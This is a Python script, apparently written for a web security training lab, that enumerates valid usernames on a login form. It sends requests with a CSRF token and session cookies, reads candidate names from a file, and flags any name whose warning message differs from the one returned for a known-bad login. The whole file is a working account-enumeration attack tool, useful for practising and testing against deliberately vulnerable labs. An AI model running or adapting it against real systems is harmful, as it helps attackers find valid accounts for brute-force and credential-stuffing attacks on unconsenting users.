import requests
import re

lab_value=" "
sessionValue=" "
host=" " 
csrftoken=" " 
usernamelist=""
pattern="p class=is-warning>(.*?)<" 

def guess_login(login):
    #cookie={'session':sessionValue}
    cookie={'_lab':lab_value,'session':sessionValue}
    #payload = {'username':login,'password':'peter'}
    payload = {'csrf':csrftoken,'username':login,'password':'peter'}
    try:
        #response = requests.post(host ,data=payload)
        response = requests.post(host ,data=payload, cookies=cookie)

    except Exception as e:
        print(e)
    spec_word = response.text.strip()
    res_text=re.search(pattern, spec_word).group()
    return res_text

def open_list_file(filepath):
    file=open(filepath,'r')
    lists=file.readlines()
    words=[]
    for i in range(len(lists)):
        words.append(lists[i].rstrip('\n').split(',')[0])        
    return words

try:
    filepath=input("Enter a filepath: ")
    usernamelist=open_list_file(filepath)
except Exception as e:
        print(e)

def bruteforce():
    response_len=guess_login("napewnozlylogin")
    tryNr=0
    for word in usernamelist:
        print(str(tryNr))
        tryNr+=1
        if response_len!=guess_login(word):
            print("valid login can be: "+word)
            break

bruteforce()
